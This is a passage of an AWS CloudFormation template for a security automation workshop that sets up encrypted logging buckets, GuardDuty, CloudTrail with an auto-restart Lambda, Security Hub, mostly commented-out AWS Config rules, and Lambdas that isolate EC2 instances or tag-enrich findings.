+    Properties:
+        BucketEncryption:
+            ServerSideEncryptionConfiguration:
+            - ServerSideEncryptionByDefault:
+                SSEAlgorithm: AES256
+        AccessControl: "LogDeliveryWrite"
+
+  GDS3Bucket: 
+      Type: AWS::S3::Bucket
+      DeletionPolicy: Retain
+      DependsOn: GDS3BucketAccessLogs
+      Properties:
+          BucketEncryption:
+              ServerSideEncryptionConfiguration:
+              - ServerSideEncryptionByDefault:
+                  SSEAlgorithm: AES256
+          LoggingConfiguration:
+              DestinationBucketName: !Ref GDS3BucketAccessLogs
+         
+  GDS3KMSKey:
+    Type: AWS::KMS::Key
+    Properties:
+      KeyPolicy:
+        Version: '2012-10-17'
+        Statement:
+        - Effect: Allow
+          Principal:
+            AWS: !Sub 'arn:aws:iam::${AWS::AccountId}:root'
+          Action: 'kms:*'
+          Resource: '*'
+        - Effect: Allow
+          Principal:
+            Service: guardduty.amazonaws.com
+          Action: 'kms:*'
+          Resource: '*'
+
+  GuardDutyKeyAlias:
+    DependsOn: GDS3KMSKey
+    Type: AWS::KMS::Alias
+    Properties:
+      AliasName: !Sub 'alias/guardduty2'
+      TargetKeyId: !Ref GDS3KMSKey
+  
+  GuardDutyS3BucketPolicy: 
+    DependsOn: GDS3KMSKey
+    Type: AWS::S3::BucketPolicy
+    Properties: 
+      Bucket: 
+        Ref: GDS3Bucket
+      PolicyDocument: 
+        Version: '2012-10-17'
+        Statement:
+        - Sid: Deny non-HTTPS access
+          Effect: Deny
+          Principal:
+            Service: guardduty.amazonaws.com
+          Action: s3:*
+          Resource: !Sub arn:aws:s3:::${GDS3Bucket}/*
+          Condition:
+            Bool:
+              aws:SecureTransport: 'false'
+        - Sid: Deny incorrect encryption header
+          Effect: Deny
+          Principal:
+            Service: guardduty.amazonaws.com
+          Action: s3:PutObject
+          Resource: !Sub arn:aws:s3:::${GDS3Bucket}/*
+          Condition:
+            StringNotEquals:
+              s3:x-amz-server-side-encryption-aws-kms-key-id: arn:aws:kms:${AWS::Region}:${AWS::AccountId}:key/${GDS3KMSKey}
+        - Sid: Deny unencrypted object uploads
+          Effect: Deny
+          Principal:
+            Service: guardduty.amazonaws.com
+          Action: s3:PutObject
+          Resource: !Sub arn:aws:s3:::${GDS3Bucket}/*
+          Condition:
+            StringNotEquals:
+              s3:x-amz-server-side-encryption: aws:kms
+        - Sid: Allow PutObject
+          Effect: Allow
+          Principal:
+            Service: guardduty.amazonaws.com
+          Action: s3:PutObject
+          Resource: !Sub arn:aws:s3:::${GDS3Bucket}/*
+        - Sid: Allow GetBucketLocation
+          Effect: Allow
+          Principal:
+            Service: guardduty.amazonaws.com
+          Action: s3:GetBucketLocation
+          Resource: !Sub arn:aws:s3:::${GDS3Bucket}
+  # GuardDuty KMS & S3 config ends here
+  
+  CloudTrail: 
+      DependsOn: 
+        - CloudTrailBucketPolicy
+        - CloudTrailS3Bucket
+      Type: AWS::CloudTrail::Trail
+      Properties:
+        #TrailName: CloudTrailEvents
+        IncludeGlobalServiceEvents: true
+        CloudWatchLogsLogGroupArn: !GetAtt CloudWatchLogGroup.Arn
+        CloudWatchLogsRoleArn: !GetAtt IamRoleForCwLogs.Arn
+        S3BucketName: 
+          Ref: CloudTrailS3Bucket
+        IsLogging: true
+        IsMultiRegionTrail: true
+        EnableLogFileValidation: true
+        EventSelectors: 
+          - ReadWriteType: WriteOnly
+
+  CloudWatchLogGroup:
+      Type: AWS::Logs::LogGroup
+      Properties: 
+       LogGroupName: WorkshopLogs
+       RetentionInDays: 7
+
+  IamRoleForCwLogs:
+      Type: 'AWS::IAM::Role'
+      Properties:
+        AssumeRolePolicyDocument:
+          Version: '2012-10-17'
+          Statement:
+            - Sid: ''
+              Effect: Allow
+              Principal:
+                Service: cloudtrail.amazonaws.com
+              Action: 'sts:AssumeRole'
+        Policies:
+          - PolicyName: allow-access-to-cw-logs
+            PolicyDocument:
+              Version: '2012-10-17'
+              Statement:
+                - Effect: Allow
+                  Action:
+                    - 'logs:CreateLogStream'
+                    - 'logs:PutLogEvents'
+                  Resource: '*'
+
+  CloudWatchLogStream:
+      Type: AWS::Logs::LogStream
+      Properties: 
+        LogGroupName: !Ref CloudWatchLogGroup
+        LogStreamName: !Ref CloudTrail
+
+  #AWS GuardDuty configuration starts here
+  GuardDuty:
+    Type: AWS::GuardDuty::Detector
+    Properties:
+        Enable: True
+        FindingPublishingFrequency: FIFTEEN_MINUTES
+
+  #AWS Config configuration starts here
+  # AWSConfigS3BucketAccessLogs:
+  #   Type: AWS::S3::Bucket
+  #   DeletionPolicy: Retain
+  #   Properties:
+  #       BucketEncryption:
+  #           ServerSideEncryptionConfiguration:
+  #           - ServerSideEncryptionByDefault:
+  #               SSEAlgorithm: AES256
+  #       AccessControl: "LogDeliveryWrite"
+
+  # AWSConfigS3Bucket: 
+  #     Type: AWS::S3::Bucket
+  #     DeletionPolicy: Retain
+  #     DependsOn: AWSConfigS3BucketAccessLogs
+  #     Properties:
+  #         BucketEncryption:
+  #             ServerSideEncryptionConfiguration:
+  #             - ServerSideEncryptionByDefault:
+  #                 SSEAlgorithm: AES256
+  #         LoggingConfiguration:
+  #             DestinationBucketName: !Ref AWSConfigS3BucketAccessLogs
+          # VersioningConfiguration:
+          #     Status: Enabled
+
+  # AWSConfigRole:
+  #   DependsOn:
+  #       - AWSConfigS3Bucket
+  #   Type: AWS::IAM::Role
+  #   Properties:
+  #     AssumeRolePolicyDocument:
+  #       Version: '2012-10-17'
+  #       Statement:
+  #       - Effect: Allow
+  #         Principal:
+  #           Service:
+  #           - config.amazonaws.com
+  #         Action:
+  #         - sts:AssumeRole
+  #     Path: "/"
+  #     ManagedPolicyArns:
+  #       - arn:aws:iam::aws:policy/service-role/AWSConfigRole
+  # AWSConfigRolePolicy:
+  #   DependsOn: AWSConfigRole
+  #   Type: AWS::IAM::Policy
+  #   Properties:
+  #     PolicyName: AWSConfigPolicy
+  #     PolicyDocument:
+  #       Version: '2012-10-17'
+  #       Statement:
+  #       - Effect: Allow
+  #         Action:
+  #           - 's3:*'
+  #         Resource:
+  #           - !GetAtt AWSConfigS3Bucket.Arn
+  #           - !Join [ "", [ !GetAtt AWSConfigS3Bucket.Arn, "/*" ] ]
+  #         Condition:
+  #           StringLike:
+  #             's3:x-amz-acl': bucket-owner-full-control
+  #       - Effect: Allow
+  #         Action:
+  #           - 'config:*'
+  #         Resource: '*'
+  #       - Effect: Allow
+  #         Action:
+  #           - 'iam:GetRole'
+  #           - 'iam:PassRole'
+  #           - 'iam:CreateServiceLinkedRole'
+  #           - 'iam:DeleteServiceLinkedRole'
+  #           - 'iam:GetServiceLinkedRoleDeletionStatus'
+  #         Resource: 'arn:aws:iam::*:role/aws-service-role/config.amazonaws.com/*'
+  #     Roles:
+  #     - !Ref AWSConfigRole
+  # ConfigRecorder:
+  #   DependsOn: AWSConfigRole
+  #   Type: 'AWS::Config::ConfigurationRecorder'
+  #   Properties:
+  #     Name: default
+  #     RoleARN:
+  #       !GetAtt AWSConfigRole.Arn
+  #     RecordingGroup: 
+  #       AllSupported: true
+  #       IncludeGlobalResourceTypes: true
+  # AWSConfigDeliveryChannel: 
+  #   DependsOn: AWSConfigRole
+  #   Type: AWS::Config::DeliveryChannel
+  #   Properties: 
+  #     ConfigSnapshotDeliveryProperties: 
+  #       DeliveryFrequency: "One_Hour"
+  #     S3BucketName: 
+  #       Ref: AWSConfigS3Bucket
+  # ConfigCloudTrailLogEncryptionEnabledRule:
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: cloudTrail-log-encryption-enabled
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "CLOUD_TRAIL_ENCRYPTION_ENABLED"
+  # ConfigCloudTrailLogValiationEnabledRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties: 
+  #     ConfigRuleName: cloudTrail-log-valiation-enabled
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "CLOUD_TRAIL_LOG_FILE_VALIDATION_ENABLED"
+  # ConfigAccessKeysRotatedRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: iam-access-keys-rotated
+  #     MaximumExecutionFrequency: One_Hour
+  #     InputParameters:
+  #       maxAccessKeyAge: 90
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "ACCESS_KEYS_ROTATED"
+  # EIPAttachedRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: eip-attached
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "EIP_ATTACHED"
+  # ELBLoggingEnabledRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: elb-logging-enabled
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "ELB_LOGGING_ENABLED"
+  # RootAccessKeyEnabledRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: root-access-key-enabled
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "IAM_ROOT_ACCESS_KEY_CHECK"
+  # EncryptedVolumesRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: encrypted-volumes
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "ENCRYPTED_VOLUMES"
+  # MFAEnabledForConsoleUsersRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: mfa-enabled-for-console-access
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "MFA_ENABLED_FOR_IAM_CONSOLE_ACCESS"
+  # MultiRegionCloudTrailRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: multi-region-cloud-trail
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "MULTI_REGION_CLOUD_TRAIL_ENABLED"
+  # RestrictSSHRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: restricted-ssh
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "INCOMING_SSH_DISABLED"
+  # MFAEnabledForRootRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: root-account-mfa-enabled
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "ROOT_ACCOUNT_MFA_ENABLED"
+  # S3PublicReadRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: s3-bucket-public-read-prohibited
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "S3_BUCKET_PUBLIC_READ_PROHIBITED"
+  # S3PublicWriteRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: s3-bucket-public-write-prohibited
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "S3_BUCKET_PUBLIC_WRITE_PROHIBITED"
+  # S3ServerSideEncryptionRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: s3-bucket-server-side-encryption-enabled
+  #     Source: 
+  #       Owner: AWS   
+  #       SourceIdentifier: "S3_BUCKET_SERVER_SIDE_ENCRYPTION_ENABLED"
+  # VPCFlowLogsEnabledRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: vpc-flow-logs-enabled
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "VPC_FLOW_LOGS_ENABLED"
+  # UnusedCredentialsRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: iam-user-unused-credentials-check
+  #     MaximumExecutionFrequency: One_Hour
+  #     InputParameters:
+  #       maxCredentialUsageAge: 30
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "IAM_USER_UNUSED_CREDENTIALS_CHECK"
+  # IAMUserMFAEnabledRule: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: iam-user-mfa-enabled
+  #     MaximumExecutionFrequency: One_Hour
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "IAM_USER_MFA_ENABLED"
+  # IAMUserInGroup: 
+  #   DependsOn: ConfigRecorder
+  #   Type: AWS::Config::ConfigRule
+  #   Properties:
+  #     ConfigRuleName: iam-user-in-group
+  #     Source: 
+  #       Owner: AWS
+  #       SourceIdentifier: "IAM_USER_GROUP_MEMBERSHIP_CHECK"
+  
+
+  # Activates Detective Graph
+  # DetectiveGraph:
+  #   Type: AWS::Detective::Graph
+
+#AWS Config configuration ends here
+  SecurityHub:
+    Type: AWS::SecurityHub::Hub
+    Properties:
+      Tags:
+        Name: 'Security Hub'
+
+# AWS Lambda function resources to restart CloudTrail start here
+  CloudTrailLambdaLogGroup:
+    Type: AWS::Logs::LogGroup
+    Properties: 
+      LogGroupName: !Sub "/aws/lambda/${EnableCloudTrailFunction}"
+
+  CloudTrailLambdaRole:
+    Type: AWS::IAM::Role
+    Properties:
+      # RoleName: CloudTrailLambdaRole
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+        - Effect: Allow
+          Principal:
+            Service:
+            - lambda.amazonaws.com
+          Action:
+          - sts:AssumeRole
+      Path: "/"
+
+  CloudTrailLambdaPolicy:
+    DependsOn: 
+      - CloudTrailLambdaRole
+    Type: AWS::IAM::Policy
+    Properties:
+      PolicyName: CloudTrailLambdaPolicy
+      PolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+        - Effect: Allow
+          Action:
+            - 'logs:CreateLogStream'
+            - 'logs:PutLogEvents'
+          Resource:
+            - !Sub arn:aws:logs:${AWS::Region}:${AWS::AccountId}:log-group:/aws/lambda/${EnableCloudTrailFunction}:*
+        - Effect: Allow
+          Action:
+            - 'cloudtrail:StartLogging'
+            - 'cloudtrail:GetTrailStatus'
+          Resource:
+            - !Sub arn:aws:cloudtrail:${AWS::Region}:${AWS::AccountId}:trail/${CloudTrail}
+        - Effect: Allow
+          Action: 'logs:CreateLogGroup'
+          Resource: !Sub arn:aws:logs:${AWS::Region}:${AWS::AccountId}:*
+      Roles:
+      - !Ref CloudTrailLambdaRole
+
+  EnableCloudTrailFunction:
+    DependsOn: 
+      - CloudTrail
+      - CloudTrailLambdaRole
+    Type: AWS::Lambda::Function
+    Properties: 
+      Handler: index.lambda_handler
+      Description: Function to restart a CloudTrail trail
+      Code:
+        ZipFile: 
+          !Join 
+              - ''
+              - - "import boto3\n"
+                - "def lambda_handler(event, context):\n"
+                - "  print('CloudTrail was restarted')\n"
+                - !Sub "  client = boto3.client('cloudtrail', region_name='${AWS::Region}')\n"
+                - !Sub "  trail_status = client.get_trail_status(Name='${CloudTrail}')['IsLogging']\n"
+                -      "  if trail_status == False:\n"
+                - !Sub "    started_logging = client.start_logging(Name='${CloudTrail}')\n"
+      Runtime: python3.7
+      FunctionName: EnableCloudTrail
+      Timeout: 60
+      Environment:
+        Variables:
+          TrailName: !Ref CloudTrail
+      Role: !GetAtt CloudTrailLambdaRole.Arn
+
+  EventRule: 
+    DependsOn: EnableCloudTrailFunction
+    Type: AWS::Events::Rule
+    Properties: 
+      Name: "Detect-CloudTrail-Stopped"
+      Description: "Rule to detect if CloudTrail was stopped"
+      EventPattern: 
+        source: 
+          - "aws.cloudtrail"
+      State: "ENABLED"
+      Targets: 
+        - 
+          Arn: !GetAtt EnableCloudTrailFunction.Arn
+          Id: !Ref EnableCloudTrailFunction
+
+  PermissionForEventsToInvokeLambda: 
+    DependsOn: EventRule
+    Type: AWS::Lambda::Permission
+    Properties: 
+      FunctionName: 
+        Ref: EnableCloudTrailFunction
+      Action: "lambda:InvokeFunction"
+      Principal: "events.amazonaws.com"
+      SourceArn: !GetAtt EventRule.Arn
+
+  ### Security Services and Logging configuration ends here ###
+
+  ### Security Hub Custom Action Lambda functions start here ###
+
+  IsolateEc2Lambda:
+      Type: "AWS::Lambda::Function"
+      Properties:
+        Description: Isolate EC2 Instance - Automating Security Workshop
+        Environment:
+          Variables:
+            Security_Team_Group: !Ref "IsolateEc2SecurityGroup"
+        FunctionName: isolate-ec2-security-group
+        Handler: index.lambda_handler
+        Role: !GetAtt IsolateEc2LambdaRole.Arn
+        Runtime: python3.7
+        Code:
+          ZipFile: |
+            import json
+            import os
+            import boto3
+            from botocore.exceptions import ClientError
+            import logging
+
+            logger = logging.getLogger()
+            logger.setLevel(logging.INFO)
+
+            ec2client = boto3.client('ec2')
+            security_team_sec_group = os.environ['Security_Team_Group']
+
+            def lambda_handler(event, context):
+
+                security_team_sg = None
+                sec_groups = []
+                vpc_id = None
+
+                logger.info(event)
+                # Get Instance ID from Cloudwatch Event - Security Hub Custom Action
+                for findings in event['detail']['findings']:
+                    for res in findings['Resources']:
+                        id_arn = (res['Id'])
+                        print(id_arn)
+                        instance_id = id_arn.split("/")[1]
+                        print(instance_id)
+
+                instance_info = ec2client.describe_instances(
+                    InstanceIds=[instance_id])
+
+                # Get and log all the existing Security Groups for this instance
+                for res in instance_info['Reservations']:
+                    for ins in res['Instances']:
+                        for sg in ins['SecurityGroups']:
+                            sec_groups.append(sg['GroupId'])
+                            print(sec_groups)
+
+                            logger.info(
+                                'Modifying Security Groups for Instance ID: %s', instance_id)
+                            logger.info('## Original Security Groups ##')
+                            logger.info(sec_groups)
+
+                #replace existing Security Groups with the isolate security group
+                try:
+                    response = ec2client.modify_instance_attribute(
+                        InstanceId=instance_id, Groups=[security_team_sec_group])
+                except ClientError as e:
+                    logger.exception(e)
+                    return 500
+
+                return response['ResponseMetadata']['HTTPStatusCode']
+                
+  EnrichEc2Lambda:
+    Type: "AWS::Lambda::Function"
+    Properties:
+        Description: Enrich Finding with EC2 Instance Tags - Automating Security Workshop
+        FunctionName: enrich-sec-hub-finding
+        Handler: index.lambda_handler
+        Role: !GetAtt EnrichSecHubRole.Arn
+        Runtime: python3.7
+        Code:
+            ZipFile: |
+                import json
+                import boto3
+                import logging
+
+                ENRICHMENT_TEXT = "This Resource Type not supported for enrichment"
+                ENRICHMENT_AUTHOR = "SecHubEnrich - General"
+                ENRICHMENT_FINDING_ID = ""
+
+                logger = logging.getLogger()
+                logger.setLevel(logging.INFO)
+
+                def postEnrichmentNote (ENRICHMENT_AUTHOR, ENRICHMENT_TEXT, ENRICHMENT_FINDING_ID):
+                    
+                    # This function takes a 'ready to post' entrichment note, author label, and 
+                    # adds them to a distinct finding ID
+                    
+                    logger.info("Text to post: " + ENRICHMENT_TEXT)
+                    
+                    secHubClient = boto3.client('securityhub')
+                    response = secHubClient.update_findings(
+                        Filters={
+                            'Id': [
+                                {
+                                    'Value': ENRICHMENT_FINDING_ID,
+                                    'Comparison': 'EQUALS'
+                                },
+                            ]
+                        },
+                        Note={
+                            'Text': ENRICHMENT_TEXT,
+                            'UpdatedBy': ENRICHMENT_AUTHOR
+                        }
+                    )
+                    
+                def enrichEc2Type(Ec2Finding):
+                    # this function takes a sechub finding event known to have the resource 
+                    # type of EC2 instance, describes all tags and returns the tags formatted to post
+                    
+                    #clear enrichment text
+                    localText = ""
+                    
+                    ec2client = boto3.client('ec2')
+                    
+                    #extract instance ID from the sec hub finding event
+                    id_arn = Ec2Finding["detail"]["findings"][0]["Resources"][0]['Id']
+                    instance_id = id_arn.split("/")[1]
+
+                    #describe instances
+                    instance_info = ec2client.describe_instances(InstanceIds=[instance_id])
+                    
+                    #loop and append the values and keys of all tags into the Enrichment Text              
+                    for res in instance_info['Reservations']:
+                        for ins in res['Instances']:
+                            for tags in ins['Tags']:
+                                localText = localText + "[" + tags["Key"]
+                                localText = localText + "]: "
+                                localText = localText + tags["Value"]
+                                localText = localText + " ,"
+                    
+                    logger.debug("Tag enrichment complete: " + localText)
+                    
+                    return localText
+                    
+                def lambda_handler(event, context):
+                    
+                    #log the event
+                    logger.info(event)
+                    
+                    #determine and log this Finding's ID
+                    ENRICHMENT_FINDING_ID = event["detail"]["findings"][0]["Id"]
+                    logger.info("Finding ID: " + ENRICHMENT_FINDING_ID)
+                    
+                    #determine and log this Finding's resource type
+                    resourceType = event["detail"]["findings"][0]["Resources"][0]["Type"]
+                    logger.info("Resource Type is: " + resourceType)
+                    
+                    #if the target resource is EC2 update the enrichment text with EC2 Tags
+                    if resourceType == "AwsEc2Instance":
+                        ENRICHMENT_AUTHOR = "SecHubEnrich - EC2 Tags"
+                        ENRICHMENT_TEXT = enrichEc2Type(event)
+                    
+                    
+                    postEnrichmentNote(ENRICHMENT_AUTHOR, ENRICHMENT_TEXT, ENRICHMENT_FINDING_ID)
+
+                    
+                    return {
+                        'statusCode': 200,
+                        'body': json.dumps('function complete')
+                    }
+
+  ### Security Hub Custom Action Lambda functions end here ###
+                 
+Outputs: 
+  VPC: 
+    Description: "A reference to the created VPC"
+    Value: !Ref "VPC"
+    Export:
+      Name: !Sub "${PMServerEnv}-VPC"
+
+  MyNetworkACL: 
+    Description: "A reference to the created VPC"
+    Value: !Ref "MyNetworkACL"
+    Export:
+      Name: "MyNetworkACL"
+
+  PublicSubnets:
+    Description: "A list of the public subnets"
+    Value: !Join [ ",", [ !Ref "PublicSubnet1", !Ref "PublicSubnet2" ]]
+
+  PrivateSubnets:
+    Description: "A list of the private subnets"
+    Value: !Join [ ",", [ !Ref "PrivateSubnet1", !Ref "PrivateSubnet2" ]]
+    Export:
+      Name: !Sub "${PMServerEnv}-PrivateSubnets"
+    
+  PrivateSubnet1:
+    Description: "A reference to the private subnet in the 1st Availability Zone"
+    Value: !Ref "PrivateSubnet1"
+    Export:
+      Name: "PrivateSubnet1"
+
+  PrivateSubnet2: 
+    Description: "A reference to the private subnet in the 2nd Availability Zone"
+    Value: !Ref "PrivateSubnet2"
+    Export:
+      Name: "PrivateSubnet2"
+
+  PublicSubnet1:
+    Description: "A reference to the public subnet in the 1st Availability Zone"
+    Value: !Ref "PublicSubnet1"
+    Export:
+      Name: "PublicSubnet1"
+
+  PublicSubnet2: 
+    Description: "A reference to the public subnet in the 2nd Availability Zone"
+    Value: !Ref "PublicSubnet2"
+    Export:
+      Name: "PublicSubnet2"
